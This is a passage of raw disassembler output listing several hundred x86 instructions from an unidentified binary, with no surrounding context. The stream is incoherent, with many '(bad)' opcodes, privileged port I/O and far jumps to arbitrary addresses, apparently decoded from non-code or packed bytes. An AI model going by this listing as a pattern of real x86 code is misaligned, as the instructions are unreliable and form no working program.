  414b1d:	xchg   edx,eax
  414b1e:	pop    ss
  414b1f:	dec    edi
  414b20:	add    esi,DWORD PTR [edx+edx*4-0x42]
  414b24:	and    ch,dh
  414b26:	aas    
  414b27:	(bad)  
  414b28:	mov    esi,0x5cc7028d
  414b2d:	mov    bl,0x2f
  414b2f:	int3   
  414b30:	lock arpl WORD PTR [edx+0x66a6465f],cx
  414b37:	fild   DWORD PTR [esi+edi*4+0x30]
  414b3b:	mov    ds:0x83052019,al
  414b40:	retf   0xcd7f
  414b43:	retf   0xe4e1
  414b46:	xchg   ebp,eax
  414b47:	push   0xd2023150
  414b4c:	dec    edi
  414b4d:	add    eax,0xa40209f4
  414b52:	pop    ecx
  414b53:	rcr    BYTE PTR [ebx+0x3],0xe7
  414b57:	push   edx
  414b58:	out    dx,eax
  414b59:	data16 sub ch,ah
  414b5c:	std    
  414b5d:	dec    edi
  414b5e:	mov    DWORD PTR [ebx+0x44e0a95f],ebp
  414b64:	pop    edi
  414b65:	push   esi
  414b66:	xchg   ecx,eax
  414b67:	ins    DWORD PTR es:[edi],dx
  414b68:	inc    ecx
  414b69:	hlt    
  414b6a:	repz fstp TBYTE PTR ds:0xe8a9b561
  414b71:	sahf   
  414b72:	in     eax,0xc2
  414b74:	js     0x414bdd
  414b76:	sbb    BYTE PTR [ecx+0x31],cl
  414b79:	pop    ebp
  414b7a:	leave  
  414b7b:	pushf  
  414b7c:	dec    edx
  414b7d:	mov    gs,WORD PTR [ecx+0x4aaa7f1]
  414b83:	sub    ebp,eax
  414b85:	jl     0x414bd1
  414b87:	mov    cl,0x6c
  414b89:	fisttp WORD PTR ds:0x3c77efe8
  414b8f:	aas    
  414b90:	icebp  
  414b91:	pushf  
  414b92:	pushf  
  414b93:	mov    edx,0x8609f70f
  414b98:	xchg   ebp,eax
  414b99:	push   esi
  414b9a:	jns    0x414bb9
  414b9c:	push   cs
  414b9d:	rcr    ah,1
  414b9f:	push   0x91fd60b4
  414ba4:	xlat   BYTE PTR ds:[ebx]
  414ba5:	scas   eax,DWORD PTR es:[edi]
  414ba6:	ins    DWORD PTR es:[edi],dx
  414ba7:	jnp    0x414b85
  414ba9:	cld    
  414baa:	pop    ebp
  414bab:	push   eax
  414bac:	and    DWORD PTR [ebx-0x3abc1fec],ecx
  414bb2:	pop    esi
  414bb3:	ja     0x414b97
  414bb5:	fxam   
  414bb7:	or     DWORD PTR [edx],0x8
  414bba:	mov    ch,0xab
  414bbc:	fadd   DWORD PTR [ecx-0x41]
  414bbf:	mov    eax,ds:0xba2dc6da
  414bc4:	jmp    0x414bad
  414bc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bc7:	push   ebx
  414bc8:	pusha  
  414bc9:	and    al,0x58
  414bcb:	sub    al,0x4f
  414bcd:	adc    BYTE PTR [esi],dh
  414bcf:	xchg   edx,eax
  414bd0:	and    edx,DWORD PTR [ecx-0x3ba34f02]
  414bd6:	jb     0x414c30
  414bd8:	in     eax,0x21
  414bda:	inc    edi
  414bdb:	dec    edi
  414bdc:	rcl    BYTE PTR [edx],0x7e
  414bdf:	xchg   edx,eax
  414be0:	sbb    al,bh
  414be2:	mov    eax,0x756d18bb
  414be7:	mov    dl,0x3
  414be9:	sbb    DWORD PTR [ebx+0x643a12a7],ebx
  414bef:	add    edi,DWORD PTR [ebx+0x3f]
  414bf2:	jmp    0x6eceb655
  414bf7:	(bad)  
  414bf8:	shl    DWORD PTR [esi],cl
  414bfa:	sbb    eax,eax
  414bfc:	leave  
  414bfd:	dec    ebp
  414bfe:	dec    esp
  414bff:	push   ebx
  414c00:	scas   al,BYTE PTR es:[edi]
  414c01:	fdiv   QWORD PTR [esi+0x4be7032d]
  414c07:	repnz xchg esp,eax
  414c09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c0a:	pop    ebx
  414c0b:	dec    dh
  414c0d:	in     eax,0x2
  414c0f:	fistp  QWORD PTR [ecx+0x7d78f90]
  414c15:	cmp    esp,0x19
  414c18:	xchg   ecx,eax
  414c19:	(bad)  
  414c1b:	test   al,0x67
  414c1d:	push   ebx
  414c1e:	pop    ebx
  414c1f:	leave  
  414c20:	fwait
  414c21:	pop    edi
  414c22:	ret    
  414c23:	push   eax
  414c24:	pop    ebp
  414c25:	addr16 mov ebp,ss
  414c28:	sbb    ch,BYTE PTR [edx]
  414c2a:	xchg   edi,eax
  414c2b:	jns    0x414bb1
  414c2d:	inc    DWORD PTR [eax+0x6f]
  414c30:	mov    fs,ebp
  414c32:	inc    DWORD PTR [esp+eax*1+0x7de192f1]
  414c39:	fisttp QWORD PTR [edi+eax*8-0x77]
  414c3d:	stos   BYTE PTR es:[edi],al
  414c3e:	in     al,dx
  414c3f:	xchg   esi,eax
  414c40:	xchg   esp,eax
  414c41:	mov    ebx,0xb3dcffd9
  414c46:	xchg   esi,eax
  414c47:	dec    ecx
  414c48:	out    0x12,al
  414c4a:	in     eax,0xf5
  414c4c:	pop    fs
  414c4e:	xor    esp,ebp
  414c50:	sub    al,0xb1
  414c52:	or     eax,0xf138b20c
  414c57:	sub    al,0x65
  414c59:	gs jo  0x414bdd
  414c5c:	mov    WORD PTR [esi-0x4760aeb2],?
  414c62:	push   0xfb132c79
  414c67:	out    0xf3,eax
  414c69:	jns    0x414c11
  414c6b:	in     al,0x4f
  414c6d:	mov    eax,ds:0x994426ec
  414c72:	push   ds
  414c73:	ja     0x414cd2
  414c75:	dec    eax
  414c76:	ds mov dl,0xfb
  414c79:	fcomp  QWORD PTR [ecx+0x1e]
  414c7c:	ins    BYTE PTR es:[edi],dx
  414c7d:	adc    bh,BYTE PTR [ecx+edx*4]
  414c80:	call   0x6769f2a3
  414c85:	sub    eax,DWORD PTR [eax+0x11e58a73]
  414c8b:	or     edi,esi
  414c8d:	pop    esp
  414c8e:	mov    edi,0xb892a129
  414c93:	popf   
  414c94:	mov    ds:0xfc0d04,al
  414c99:	adc    esp,DWORD PTR [ebx-0x2b]
  414c9c:	inc    esi
  414c9d:	outs   dx,BYTE PTR ds:[esi]
  414c9e:	aam    0x68
  414ca0:	xchg   edi,eax
  414ca1:	repz out dx,eax
  414ca3:	inc    ebp
  414ca4:	rcr    BYTE PTR [ebx+ecx*2+0x78cf4f8d],1
  414cab:	ins    DWORD PTR es:[edi],dx
  414cac:	fnstsw WORD PTR [esi]
  414cae:	push   0xacdf9303
  414cb3:	pop    ds
  414cb4:	ds inc edi
  414cb6:	fs ds push esi
  414cb9:	sub    bl,BYTE PTR [edx]
  414cbb:	and    dh,cl
  414cbd:	and    BYTE PTR [ebx+0x5b],ah
  414cc0:	mov    eax,0x4905a8ec
  414cc5:	mov    es,esp
  414cc7:	mov    bh,0xa4
  414cc9:	jg     0x414d29
  414ccb:	and    BYTE PTR [edx-0x3e],bl
  414cce:	cdq    
  414ccf:	xor    ah,bl
  414cd1:	cmp    eax,0x74eaa0c0
  414cd6:	(bad)
  414cdb:	scas   al,BYTE PTR es:[edi]
  414cdc:	and    al,0xcf
  414cde:	jecxz  0x414ce9
  414ce0:	test   BYTE PTR [esi+ecx*4+0x125bb4d7],al
  414ce7:	hlt    
  414ce8:	add    dl,BYTE PTR [ebp-0xd32f5e1]
  414cee:	arpl   WORD PTR [esi+edi*1-0x2d8e5ef8],di
  414cf5:	cmp    BYTE PTR [esi+edx*8-0x1c],bh
  414cf9:	int3   
  414cfa:	mov    fs,WORD PTR [ebx-0x1e]
  414cfd:	cmc    
  414cfe:	cld    
  414cff:	pop    ebp
  414d00:	pop    ebx
  414d01:	sbb    DWORD PTR ds:0x90afef47,esi
  414d07:	push   esi
  414d08:	dec    esp
  414d09:	(bad)  
  414d0a:	loopne 0x414c8e
  414d0c:	loope  0x414d7c
  414d0e:	fnsave [ebx-0x2d]
  414d11:	and    bh,BYTE PTR [edx-0xa8bf5f1]
  414d17:	int    0x9a
  414d19:	jl     0x414cf9
  414d1b:	inc    ch
  414d1d:	es mov edx,0x81b7d7dd
  414d23:	mov    es,WORD PTR [esi-0x34]
  414d26:	add    ch,BYTE PTR [ecx]
  414d28:	mov    edi,0xbe333469
  414d2d:	inc    esi
  414d2e:	dec    eax
  414d2f:	ret    
  414d30:	test   al,0xd
  414d32:	inc    ah
  414d34:	push   ds
  414d35:	aaa    
  414d36:	cmp    al,0x7d
  414d38:	xor    cl,ah
  414d3a:	mov    esi,0xd4fa5e9b
  414d3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d41:	fsubr  QWORD PTR [edx-0xf]
  414d44:	cmp    bh,BYTE PTR [ebx-0x45]
  414d47:	scas   al,BYTE PTR es:[edi]
  414d48:	inc    ebx
  414d49:	fwait
  414d4a:	mov    WORD PTR [esi+0x67],?
  414d4d:	(bad)  
  414d4e:	int3   
  414d4f:	mov    dh,0x8c
  414d51:	jno    0x414d2a
  414d53:	sbb    WORD PTR [esi],dx
  414d56:	xor    DWORD PTR [edi-0x3d],edi
  414d59:	scas   al,BYTE PTR es:[edi]
  414d5a:	ret    
  414d5b:	push   ebp
  414d5c:	xchg   BYTE PTR [edx],dl
  414d5e:	scas   eax,DWORD PTR es:[edi]
  414d5f:	ret    
  414d60:	movntq QWORD PTR [esi+0x6615142a],mm0
  414d67:	in     al,dx
  414d68:	sti    
  414d69:	push   0xffffff91
  414d6b:	xchg   bp,ax
  414d6d:	jge    0x414d53
  414d6f:	mov    al,ds:0x29c3f848
  414d74:	push   es
  414d75:	mov    DWORD PTR [edi-0xd5fc09e],ecx
  414d7b:	mov    ds:0xc5309b8f,al
  414d80:	mov    eax,ds:0xe67e1fd9
  414d85:	pop    esp
  414d86:	not    BYTE PTR [eax+0x29b8f28c]
  414d8c:	sbb    bh,BYTE PTR [eax]
  414d8e:	mov    esi,0x91437a4
  414d93:	mov    al,0x76
  414d95:	add    al,0x5e
  414d97:	imul   ecx,DWORD PTR [ebx-0x31828f2f],0x4b
  414d9e:	scas   eax,DWORD PTR es:[edi]
  414d9f:	sbb    DWORD PTR [edx+0x15],ecx
  414da2:	adc    eax,0x10c454b
  414da7:	into   
  414da8:	popf   
  414da9:	div    DWORD PTR [edi]
  414dab:	daa    
  414dac:	out    0xa4,al
  414dae:	mov    ebx,0xb28acadb
  414db3:	cwde   
  414db4:	call   0x787a:0x59ea99cd
  414dbb:	cs dec edx
  414dbd:	xchg   edi,eax
  414dbe:	pop    ebp
  414dbf:	ficom  WORD PTR [esi-0x2a]
  414dc2:	cmp    ch,BYTE PTR [eax+eax*4-0x64f09e87]
  414dc9:	ss pop edi
  414dcb:	or     ah,BYTE PTR [ebp-0x357cdd92]
  414dd1:	jne    0x414d9b
  414dd3:	xor    dl,BYTE PTR [edi]
  414dd5:	test   eax,0x54b7ccff
  414dda:	push   ecx
  414ddb:	into   
  414ddc:	jmp    0xa69c:0x6eae0179
  414de3:	xor    BYTE PTR [ebx],dl
  414de5:	mov    esi,0x3ec6a7bd
  414dea:	push   cs
  414deb:	mov    esp,0xa1a68bc
  414df0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414df1:	xchg   ebx,eax
  414df2:	mov    eax,ds:0x12174281
  414df7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414df8:	repz add ebx,DWORD PTR [ebx+0x30db8126]
  414dff:	push   0x70
  414e01:	imul   esi,DWORD PTR [ecx-0x6188334b],0x12
  414e08:	stos   DWORD PTR es:[edi],eax
  414e09:	int3   
  414e0a:	mov    ds:0x15d6f95f,eax
  414e0f:	lahf   
  414e10:	ins    DWORD PTR es:[edi],dx
  414e11:	inc    esp
  414e12:	stos   DWORD PTR es:[edi],eax
  414e13:	mov    ds:0x77928,al
  414e18:	cs jle 0x414df3
  414e1b:	out    0x5,al
  414e1d:	dec    eax
  414e1e:	inc    ecx
  414e1f:	ins    DWORD PTR es:[edi],dx
  414e20:	sub    ah,dl
  414e22:	mov    ebx,0xc0cda66b
  414e27:	aad    0xdd
  414e29:	dec    edi
  414e2a:	add    ecx,DWORD PTR [esi+ebx*1+0x3222e999]
  414e31:	not    bh
  414e33:	outs   dx,DWORD PTR ds:[esi]
  414e34:	inc    edi
  414e35:	pop    ebx
  414e36:	hlt    
  414e37:	add    edi,DWORD PTR [esi+ebx*1+0x33]
  414e3b:	cmp    eax,0x3b574019
  414e40:	inc    esp
  414e41:	mov    gs,edx
  414e43:	or     DWORD PTR [ebx],esi
  414e45:	cld    
  414e46:	xor    edi,eax
  414e48:	hlt    
  414e49:	ins    DWORD PTR es:[edi],dx
  414e4a:	sub    BYTE PTR [eax+0x7940e7e9],al
  414e50:	retf   
  414e51:	or     al,0xff
  414e53:	fwait
  414e54:	(bad)  
  414e55:	ja     0x414df6
  414e57:	je     0x414ec2
  414e59:	cs pop ds
  414e5b:	adc    DWORD PTR [edx+ebx*4],0x1aeae23c
  414e62:	and    ecx,edx
  414e64:	ins    BYTE PTR es:[edi],dx
  414e65:	mov    bh,BYTE PTR ds:[ecx+0x773285e2]
  414e6c:	ficomp DWORD PTR [ecx]
  414e6e:	mov    ch,BYTE PTR [edi-0x24]
  414e71:	imul   ebp,ecx,0x8f2e51f9
  414e77:	je     0x414e1f
  414e79:	push   edx
  414e7a:	add    al,al
  414e7c:	out    dx,eax
  414e7d:	jno    0x414e4d
  414e7f:	imul   ebp,DWORD PTR cs:[esi],0x98134e0b
  414e86:	out    dx,eax
  414e87:	adc    bh,BYTE PTR [ebp+0x70a493dc]
  414e8d:	add    dl,BYTE PTR [eax+edi*1-0x74cc49dc]
  414e94:	adc    eax,0x9095b64b
  414e99:	pop    ebp
  414e9a:	sub    BYTE PTR [eax],cl
  414e9c:	jle    0x414e39
  414e9e:	dec    ecx
  414e9f:	sub    ebx,DWORD PTR [edx+edi*1]
  414ea2:	cmp    eax,0x86409b03
  414ea7:	cmc    
  414ea8:	lds    esp,FWORD PTR [ecx]
  414eaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414eab:	mov    ?,WORD PTR [ebx]
  414ead:	call   0x47ffd212
  414eb2:	adc    ah,BYTE PTR [esi]
  414eb4:	mov    edi,eax
  414eb6:	arpl   WORD PTR [ecx],ax
  414eb8:	aaa    
  414eb9:	not    DWORD PTR [edx+esi*8+0x59315e95]
  414ec0:	push   ecx
  414ec1:	push   es
  414ec2:	jmp    0x414e9d
  414ec4:	ins    DWORD PTR es:[edi],dx
  414ec5:	add    BYTE PTR [eax-0x750f0795],al
  414ecb:	and    DWORD PTR [esi],ebp
  414ecd:	jnp    0x414ef8
  414ecf:	mov    esp,0xf3680eaa
  414ed4:	stc    
  414ed5:	pop    edi
  414ed6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ed7:	dec    eax
  414ed8:	and    al,0x4c
  414eda:	cli    
  414edb:	mov    WORD PTR [eax+eax*1],ds
  414ede:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414edf:	pop    ebx
  414ee0:	pusha  
  414ee1:	fwait
  414ee2:	add    BYTE PTR [ebp+edi*4+0x44299b19],0x99
  414eea:	sbb    al,0xa2
  414eec:	or     BYTE PTR [edx-0x1d],bl
  414eef:	fild   WORD PTR [ecx]
  414ef1:	xorps  xmm7,XMMWORD PTR [edx+0xc36125]
  414ef8:	add    ebp,DWORD PTR [eax+0x46]
  414efb:	ss inc edx
  414efd:	dec    eax
  414efe:	push   ebx
  414eff:	test   al,0xc7
  414f01:	mov    DWORD PTR [eax+0x7d6224ca],eax
  414f07:	mov    eax,ds:0x222c00d9
  414f0c:	aad    0x7f
  414f0e:	outs   dx,DWORD PTR ds:[esi]
  414f0f:	xor    al,0x2b
  414f11:	cmp    dh,BYTE PTR [ebx+0x4fa3c374]
  414f17:	pop    esi
  414f18:	loope  0x414f5b
  414f1a:	and    eax,0xa0c7446a
  414f1f:	and    eax,0x23b952a1
  414f24:	sbb    DWORD PTR [ebp+0x71],ebx
  414f27:	in     al,0xa3
  414f29:	xor    BYTE PTR [ebx],dl
  414f2b:	(bad)  
  414f2c:	es pushf 
  414f2e:	mov    ebp,0xd46d4327
  414f33:	test   eax,0x71ac372a
  414f38:	mov    DWORD PTR [edi-0x53a3937],0x8a0ab8db
  414f42:	pop    esi
  414f43:	repz in eax,dx
  414f45:	ret    0x6944
  414f48:	test   DWORD PTR [ebx+0x4e],edi
  414f4b:	enter  0x6395,0xa0
  414f4f:	dec    eax
  414f50:	mov    edi,0x286b8d1
  414f55:	xor    DWORD PTR [edx+0x67],eax
  414f58:	addr16 sti 
  414f5a:	xor    DWORD PTR [ebx+0x2fa4f92a],edx
  414f60:	shl    cl,0x7f
  414f63:	adc    edx,DWORD PTR [edi-0x5d5bd5a7]
  414f69:	xchg   esi,eax
  414f6a:	test   BYTE PTR [ecx],ch
  414f6c:	pop    eax
  414f6d:	sub    al,0x62
  414f6f:	popf   
  414f70:	push   ss
  414f71:	or     bh,BYTE PTR [edx]
  414f73:	ret    0xda2d
  414f76:	adc    bl,ah
  414f78:	icebp  
  414f79:	pop    ds
  414f7a:	and    DWORD PTR [ebp+0x58],0x1f32a895
  414f81:	sbb    cl,BYTE PTR [edx-0x2d93baff]
  414f87:	lock rcl DWORD PTR [ebx+0x39b7a4f5],cl
  414f8e:	cwde   
  414f8f:	imul   ebx
  414f91:	xchg   BYTE PTR ds:0xede92029,dl
  414f97:	xchg   ecx,eax
  414f98:	or     eax,0xc1196288
  414f9d:	push   ecx
  414f9e:	dec    ecx
  414f9f:	and    eax,DWORD PTR [eax-0x6868b316]
  414fa5:	xchg   edx,eax
  414fa6:	or     DWORD PTR [ecx+0x66],esi
  414fa9:	add    dh,BYTE PTR [edx-0x4b9525db]
  414faf:	xchg   esi,eax
  414fb0:	push   ds
  414fb1:	sub    eax,0xfe24aaf8
  414fb6:	int3   
  414fb7:	jp     0x414fb7
  414fb9:	inc    ebp
  414fba:	jge    0x414fe0
  414fbc:	repz sub bl,bl
  414fbf:	stos   DWORD PTR es:[edi],eax
  414fc0:	mov    bl,0xa1
  414fc2:	mov    edx,0x18665344
  414fc7:	cwde   
  414fc8:	aas    
  414fc9:	push   ss
  414fca:	jg     0x414f4d
  414fcc:	rol    DWORD PTR [esi+edx*1-0x5521d87a],cl
  414fd3:	out    0x96,eax
  414fd5:	jb     0x415005
  414fd7:	(bad)  
  414fd8:	adc    eax,0x9ab62f41
  414fdd:	shl    edx,0x5
  414fe0:	and    BYTE PTR [esi-0x545f71fa],ch
  414fe6:	and    eax,0xbfac606a
  414feb:	xor    eax,0xd1eb6f25
  414ff0:	xchg   edx,eax
  414ff1:	sub    ebx,DWORD PTR [ebx]
  414ff3:	lods   al,BYTE PTR ds:[esi]
  414ff4:	sti    
  414ff5:	cmc    
  414ff6:	ins    BYTE PTR es:[edi],dx
  414ff7:	pop    ecx
  414ff8:	or     eax,0x86e22856
  414ffd:	inc    esi
  414ffe:	outs   dx,DWORD PTR gs:[esi]
  415000:	xor    eax,0x7a9c63f4
  415005:	outs   dx,BYTE PTR ds:[esi]
  415006:	cs adc eax,DWORD PTR ss:0x817f222a
  41500e:	adc    dl,ah
  415010:	push   es
  415011:	outs   dx,BYTE PTR ds:[esi]
  415012:	mov    esp,0xdf7fdd88
  415017:	call   0x236a9420
  41501c:	mov    al,ds:0x4bbca9bd
  415021:	xchg   ecx,eax
  415022:	(bad)  
  415023:	clc    
  415024:	push   ds
  415025:	ret    
  415026:	push   edx
  415027:	out    0x31,eax
  415029:	mov    edx,DWORD PTR [esi]
  41502b:	sti    
  41502c:	in     eax,dx
  41502d:	shl    DWORD PTR [eax+0x21],0x58
  415031:	aas    
  415032:	sub    dl,BYTE PTR [ebx-0x1d]
  415035:	jecxz  0x415062
  415037:	ins    DWORD PTR es:[edi],dx
  415038:	pop    ebp
  415039:	inc    esi
  41503a:	sub    DWORD PTR [ebx-0x6d9add3d],ecx
  415040:	add    DWORD PTR [eax],esp
  415042:	mov    al,BYTE PTR [eax-0x63997979]
  415048:	inc    edi
  415049:	nop
  41504a:	push   esi
  41504b:	hlt    
  41504c:	xor    al,0xbe
  41504e:	mov    edx,0x1938424c
  415053:	das    
  415054:	xor    BYTE PTR [ebp+0x473c1dbb],0x77
  41505b:	xchg   esi,eax
  41505c:	lahf   
  41505d:	cmp    BYTE PTR [esi],0x31
  415060:	and    DWORD PTR [ecx-0x6b],ebp
  415063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415064:	rol    edi,0x94
  415067:	stos   DWORD PTR es:[edi],eax
  415068:	cmp    edi,esi
  41506a:	mov    ch,0x73
  41506c:	pushf  
  41506d:	adc    eax,ecx
  41506f:	cs test al,0x32
  415072:	push   esp
  415073:	push   esp
  415074:	mov    esp,0x9b579bba
  415079:	psrlq  mm2,mm0
  41507c:	mov    BYTE PTR [ebx],cl
  41507e:	cs (bad) 
  415080:	shl    DWORD PTR [esi+0x12],0xad
  415084:	cmp    ch,ah
  415086:	xor    DWORD PTR [ecx],esp
  415088:	bnd call 0x4f71c94c
  41508e:	imul   edi,DWORD PTR [esi],0x52
  415091:	outs   dx,BYTE PTR ds:[esi]
  415092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415093:	inc    eax
  415094:	jo     0x415079
  415096:	and    eax,0xa1607d92
  41509b:	scas   al,BYTE PTR es:[edi]
  41509c:	xchg   ebx,eax
  41509d:	mov    ch,0xf6
  41509f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150a1:	inc    ebx
  4150a2:	nop
  4150a3:	sub    BYTE PTR [edx-0x5d86c047],dl
  4150a9:	mov    bl,0xea
  4150ab:	ins    DWORD PTR es:[edi],dx
  4150ac:	sub    al,0x71
  4150ae:	hlt    
  4150af:	sub    edx,0xffffffb8
  4150b2:	mov    esi,0x9e45e79a
  4150b7:	inc    esp
  4150b8:	nop
  4150b9:	lds    edx,FWORD PTR ds:0x272de54d
  4150bf:	sbb    al,cl
  4150c1:	jmp    0x4150d4
  4150c3:	fstp   DWORD PTR [edi+0x1f]
  4150c6:	nop
  4150c7:	dec    esi
  4150c8:	imul   ecx,DWORD PTR [ebx],0xffffffa3
  4150cb:	xor    eax,0x3a5a5f5e
  4150d0:	inc    ebx
  4150d1:	adc    eax,0x35bebe35
  4150d6:	scas   al,BYTE PTR es:[edi]
  4150d7:	pushf  
  4150d8:	stc    
  4150d9:	mov    ebp,0x5ecb5e1e
  4150de:	es addr16 jmp 0x2a26:0xa296666c
  4150e7:	cmp    DWORD PTR [edi-0x30],ebx
  4150ea:	mov    WORD PTR [ecx-0x2e],?
  4150ed:	dec    esp
  4150ee:	cli    
  4150ef:	sub    al,0xe3
  4150f1:	add    esp,esi
  4150f3:	adc    esi,esp
  4150f5:	and    eax,0xa0a894ef
  4150fb:	add    ecx,ecx
  4150fd:	test   BYTE PTR [esi-0x72b74327],bl
  415103:	mov    dl,0xf4
  415105:	lods   eax,DWORD PTR ds:[esi]
  415106:	out    0x79,eax
  415108:	sahf   
  415109:	int    0x95
  41510b:	aaa    
  41510c:	sub    esp,DWORD PTR [ebp-0x34b91d0d]
  415112:	jg     0x4150ec
  415114:	push   ds
  415115:	inc    edi
  415116:	jg     0x41512d
  415118:	cmp    al,0xde
  41511a:	(bad)  
  41511b:	dec    edi
  41511c:	ds cmp eax,0x79a71369
  415122:	gs pop es
  415124:	in     eax,0xe0
  415126:	sbb    ecx,ecx
  415128:	adc    BYTE PTR [esi+0x43],al
  41512b:	jns    0x415155
  41512d:	jmp    0x185:0x9bce7884
  415134:	or     eax,0x6b99d64
  415139:	ds cwde 
  41513b:	rcl    DWORD PTR [esi+0x5f],cl
  41513e:	cmp    edx,ecx
  415140:	mov    cl,BYTE PTR [edi]
  415142:	inc    eax
  415143:	in     al,0xe0
  415145:	mov    ah,0x0
  415147:	das    
  415148:	add    DWORD PTR [edx+ebp*1-0x182ff83e],esp
  41514f:	adc    DWORD PTR [esi],ecx
  415151:	clc    
  415152:	dec    eax
  415153:	test   BYTE PTR fs:[ecx],0x83
  415157:	push   ebx
  415158:	pop    eax
  415159:	leave  
  41515a:	imul   ebp,DWORD PTR [edi],0xffffffc1
  41515d:	and    ah,0xe8
  415160:	xor    al,0xb0
  415162:	push   ebp
  415163:	imul   BYTE PTR [eax]
  415165:	fcom   QWORD PTR [ecx]
  415167:	outs   dx,BYTE PTR ds:[esi]
  415168:	sbb    cl,0x57
  41516b:	pop    edx
  41516c:	retf   
  41516d:	mov    ebp,0x624dd662
  415172:	fmul   QWORD PTR [ebx+edi*2+0x7e]
  415176:	outs   dx,BYTE PTR ds:[esi]
  415177:	push   edx
  415178:	dec    edi
  415179:	leave  
  41517a:	test   BYTE PTR [ecx],ah
  41517c:	in     eax,dx
  41517d:	pop    es
  41517e:	fdivr  DWORD PTR [ebx+0x35]
  415181:	sbb    edx,DWORD PTR [edx+0x71120d53]
  415187:	aam    0x4e
  415189:	jmp    0x34abbfa7
  41518e:	hlt    
  41518f:	or     DWORD PTR [ebx+0x57],0x61
  415193:	cmc    
  415194:	ret    
  415195:	lea    eax,[eax]
  415197:	daa    
  415198:	div    ebx
  41519a:	jecxz  0x415203
  41519c:	or     eax,0x9f4f5f14
  4151a1:	dec    edi
  4151a2:	dec    DWORD PTR ds:0x7554ddec
  4151a8:	(bad)  
  4151aa:	retf   
  4151ab:	frstor [edi-0x39ea1134]
  4151b1:	imul   esp,esp,0x79ebf1b7
  4151b7:	push   cs
  4151b8:	std    
  4151b9:	jg     0x415147
  4151bb:	adc    dl,BYTE PTR [ebx-0x1a012c59]
  4151c1:	popf   
  4151c2:	daa    
  4151c3:	stos   DWORD PTR es:[edi],eax
  4151c4:	mov    al,0x10
  4151c6:	in     al,dx
  4151c7:	enter  0xb39c,0xc0
  4151cb:	mov    edi,0xeb5c144f
  4151d0:	scas   al,BYTE PTR es:[edi]
  4151d1:	test   BYTE PTR ds:0xb2ef3f6f,dh
  4151d7:	dec    ebx
  4151d8:	imul   ecx,DWORD PTR [eax+0x3b2d29ec],0xffffff89
  4151df:	inc    eax
  4151e0:	loop   0x41523a
  4151e2:	mov    DWORD PTR [edi-0x7f],esi
  4151e5:	cmp    eax,DWORD PTR [ebx]
  4151e7:	xchg   ebx,esi
  4151e9:	dec    edx
  4151ea:	test   esi,esi
  4151ec:	add    ecx,edx
  4151ee:	jbe    0x4151f6
  4151f0:	adc    cl,al
  4151f2:	mov    eax,0xfd36403b
  4151f7:	sbb    esp,DWORD PTR [ebx+ebx*4+0x6]
  4151fb:	mov    eax,0x9ac19d6f
  415200:	dec    eax
  415201:	popf   
  415202:	iret   
  415203:	add    eax,0x1d385ca2
  415208:	pop    eax
  415209:	jle    0x4151db
  41520b:	ds jbe 0x41521a
  41520e:	dec    esp
  41520f:	and    bh,cl
  415211:	push   0xffffff90
  415213:	jge    0x41525c
  415215:	sar    BYTE PTR [eax-0x53f1be4d],1
  41521b:	(bad)  [edx-0x305f02c]
  415221:	jno    0x415232
  415223:	rcr    DWORD PTR ds:0x1366528d,cl
  415229:	mov    gs,WORD PTR [ebx-0x2f]
  41522c:	xchg   DWORD PTR [edi-0x3130043e],esi
  415232:	pop    edx
  415233:	sub    BYTE PTR [edi-0x50b50f42],dh
  415239:	adc    eax,0x61c24f28
  41523e:	jmp    0x126f3277
  415243:	mov    esp,0xf04140fb
  415248:	in     eax,dx
  415249:	cdq    
  41524a:	push   0x401491ab
  41524f:	and    eax,0xd7cbd4cc
  415254:	lock retf 
  415256:	arpl   WORD PTR [esi],di
  415258:	xchg   esp,eax
  415259:	cmp    esi,0x84a00d8a
  41525f:	daa    
  415260:	sbb    eax,DWORD PTR [edi-0x27]
  415263:	mov    ds:0xfeeb5805,eax
  415268:	loope  0x415298
  41526a:	sbb    DWORD PTR [edi+0x38],eax
  41526d:	pop    ds
  41526e:	cmp    BYTE PTR [ebx-0x168ce094],ch
  415274:	ret    0x6347
  415277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415278:	or     eax,0xa903b68b
  41527d:	push   0x1b1bad2c
  415282:	add    ebx,edi
  415284:	mov    ebx,DWORD PTR [edi-0x2e62ff29]
  41528a:	jae    0x4152e4
  41528c:	cmp    eax,0x8f75e545
  415291:	lods   al,BYTE PTR ds:[esi]
  415292:	loope  0x415299
  415294:	inc    ebp
  415295:	ss das 
  415297:	loop   0x415291
  415299:	lahf   
  41529a:	ja     0x41531a
  41529c:	setg   BYTE PTR [ebp+0x4db2eed4]
  4152a3:	sub    al,0x1f
  4152a5:	jmp    0x415269
  4152a7:	mov    eax,ds:0x31cdeaef
  4152ac:	jmp    0x4152a7
  4152ae:	adc    al,0xb4
  4152b0:	pop    ebp
  4152b1:	lea    esi,[eax]
  4152b3:	loopne 0x415237
  4152b5:	adc    dh,dh
  4152b7:	icebp  
  4152b8:	daa    
  4152b9:	adc    dl,BYTE PTR [edx+0x27]
  4152bc:	(bad)  
  4152bd:	jb     0x4152a5
  4152bf:	adc    ch,bh
  4152c1:	std    
  4152c2:	push   esi
  4152c3:	fcmovnbe st,st(0)
  4152c5:	test   dh,dh
  4152c7:	sti    
  4152c8:	and    dl,ah
  4152ca:	adc    ah,BYTE PTR [ebx+0x35]
  4152cd:	jge    0x4152fd
  4152cf:	mov    BYTE PTR [edi],bh
  4152d1:	add    ah,BYTE PTR [edi-0x397c0ac5]
  4152d7:	adc    edx,DWORD PTR [ebp+0x2133350b]
  4152dd:	inc    cl
  4152df:	and    cl,bl
  4152e1:	jmp    0x4152f9
  4152e3:	adc    dl,al
  4152e5:	test   BYTE PTR [edx+0x4fdca9d9],ah
  4152eb:	xor    al,ah
  4152ed:	cmc    
